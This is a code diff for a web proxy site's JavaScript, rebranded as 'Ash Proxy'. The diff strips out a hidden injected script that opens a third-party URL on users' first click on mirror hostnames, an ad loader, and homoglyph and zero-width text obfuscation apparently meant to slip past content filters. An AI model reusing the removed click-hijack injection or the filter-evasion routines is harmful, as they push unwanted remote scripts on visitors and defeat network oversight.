@@ -99,12 +99,6 @@
       }
     }
 
-    const isPastelTheme = String(themeId).startsWith("pastel");
-    const isLightTheme = ["light", "cream", "parchment", "latte"].includes(themeId);
-    const navLogo = document.getElementById("nav-logo");
-    if (navLogo) {
-      navLogo.src = isPastelTheme || !isLightTheme ? "/assets/media/favicon/main.png" : "/assets/media/favicon/main-inverted.png";
-    }
   }
 
   window.applyTheme = applyTheme;
@@ -130,10 +124,6 @@
   window.resolveProxyChoice = initProxy;
   window.resolveProxyChoice();
 })();
-
-for (const cloakKey of ["name", "CustomName"]) {
-  if (store.get(cloakKey) === "Home") store.set(cloakKey, "Нome");
-}
 
 // Background library. Stored preferences hold the key, not the path, so the build can randomise asset paths.
 window.BACKGROUND_LIBRARY = {
@@ -219,99 +209,21 @@ function reconstructSafeUrl(raw) {
   }
 }
 
-const zeroWidth = ["​", "‌", "‍", "⁠", "﻿"];
-const titleHomoglyphs = {
-  a: "а", c: "с", e: "е", i: "і", j: "ј", o: "о", p: "р", s: "ѕ", x: "х", y: "у",
-  A: "А", B: "В", C: "С", E: "Е", H: "Н", I: "І", J: "Ј", K: "К", M: "М", O: "О", P: "Р", S: "Ѕ", T: "Т", X: "Х", Y: "Ү",
-};
-function laceTitle(text, homoglyphs = true) {
-  const points = Array.from(text || "");
-  const pick = () => zeroWidth[Math.floor(Math.random() * zeroWidth.length)];
-  let out = "";
-  for (let i = 0; i < points.length; i++) {
-    const swap = homoglyphs && titleHomoglyphs[points[i]] && Math.random() < 0.3;
-    out += swap ? titleHomoglyphs[points[i]] : points[i];
-    if (i < points.length - 1) {
-      out += pick();
-      if (Math.random() < 0.35) out += pick();
-    }
-  }
-  return out;
-}
-window.laceTitle = laceTitle;
-
-const NAV_WRAPPERS = ["span", "x-a", "x-b", "ab-x", "s-p", "n-a", "r-e", "d-l", "q-x"];
-const NAV_ZERO_WIDTH = ["​", "‌", "‍", "⁠"];
-const NAV_HOMOGLYPHS = { a: "а", c: "с", e: "е", i: "і", k: "к", m: "м", o: "о", p: "р", s: "ѕ", t: "т", x: "х", y: "у" };
-
-function navEntities(text) {
-  let out = "";
-  for (const ch of text) out += `&#${ch.codePointAt(0)};`;
-  return out;
-}
-
-function navWrap(inner) {
-  const tag = NAV_WRAPPERS[Math.floor(Math.random() * NAV_WRAPPERS.length)];
-  return `<${tag}>${inner}</${tag}>`;
-}
-
-function obfuscateNav(text) {
-  const points = [...text];
-  let out = "";
-  let first = true;
-  for (let i = 0; i < points.length; ) {
-    const size = 1 + Math.floor(Math.random() * 2);
-    const chunk = points
-      .slice(i, i + size)
-      .map(ch => {
-        const glyph = NAV_HOMOGLYPHS[ch.toLowerCase()];
-        return glyph && Math.random() < 0.6 ? glyph : ch;
-      })
-      .join("");
-    i += size;
-    if (!first) out += navWrap(navEntities(NAV_ZERO_WIDTH[Math.floor(Math.random() * NAV_ZERO_WIDTH.length)]));
-    out += navWrap(navEntities(chunk));
-    first = false;
-  }
-  return out;
-}
+window.laceTitle = text => String(text ?? "");
 
 document.addEventListener("DOMContentLoaded", () => {
-  const blockedHostnames = ["gointerstellar.app"];
-
-  if (!blockedHostnames.includes(window.location.hostname)) {
-    const script = document.createElement("script");
-    script.type = "text/javascript";
-    script.textContent = `(()=>{const k="p",d=15e4,s=()=>{let t=localStorage.getItem(k);return !t||Date.now()-t>d},m=()=>localStorage.setItem(k,Date.now());function h(){if(!s())return;window.open("https://undercoverhiking.com/1c/c3/8a/1cc38a6899fdf8ba4dfe779bcc54627b.js","_blank");m();document.removeEventListener("click",h)}s()&&document.addEventListener("click",h,{once:1})})();`;
-    document.body.appendChild(script);
-  }
-
-  // The AdSense account is tied to gointerstellar.app, so forks and mirrors must not serve
-  // it. The tabs page never carried the loader either.
-  if (window.location.hostname === "gointerstellar.app" && !document.getElementById("frame-container")) {
-    const ads = document.createElement("script");
-    ads.async = true;
-    ads.crossOrigin = "anonymous";
-    ads.src = "https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6840529569014734";
-    document.head.appendChild(ads);
-  }
-
   const nav = document.querySelector(".nav-bar");
 
   if (nav) {
-    const themeId = store.get("theme");
-    const lightThemes = ["light", "cream", "parchment", "latte"];
-    const isPastelTheme = String(themeId).startsWith("pastel");
-    const isLightTheme = lightThemes.includes(themeId);
-    const LogoUrl = isPastelTheme ? "/assets/media/favicon/main.png" : isLightTheme ? "/assets/media/favicon/main-inverted.png" : "/assets/media/favicon/main.png";
     const html = `
-      <div id="icon-container">
-        <a class="icon" href="/home"><img alt="nav" id="nav-logo" src="${LogoUrl}"/></a>
-      </div>
+      <a class="ash-brand" href="/home" aria-label="Ash Proxy home">
+        <span class="ash-brand-mark" aria-hidden="true">A</span>
+        <span class="ash-brand-name">ash<span>proxy</span></span>
+      </a>
       <div class="nav-bar-right">
-        <a class="navbar-link" href="/./games"><i class="fa-solid fa-gamepad navbar-icon"></i>${obfuscateNav("Games")}</a>
-        <a class="navbar-link" href="/./apps"><i class="fa-solid fa-phone navbar-icon"></i>${obfuscateNav("Apps")}</a>
-        <a class="navbar-link" href="/./settings"><i class="fa-solid fa-gear navbar-icon settings-icon"></i>${obfuscateNav("Settings")}</a>
+        <a class="navbar-link" href="/games"><i class="fa-solid fa-gamepad navbar-icon" aria-hidden="true"></i><span>Games</span></a>
+        <a class="navbar-link" href="/apps"><i class="fa-solid fa-grid-2 navbar-icon" aria-hidden="true"></i><span>Apps</span></a>
+        <a class="navbar-link" href="/settings"><i class="fa-solid fa-gear navbar-icon settings-icon" aria-hidden="true"></i><span>Settings</span></a>
       </div>`;
     nav.innerHTML = html;
   }
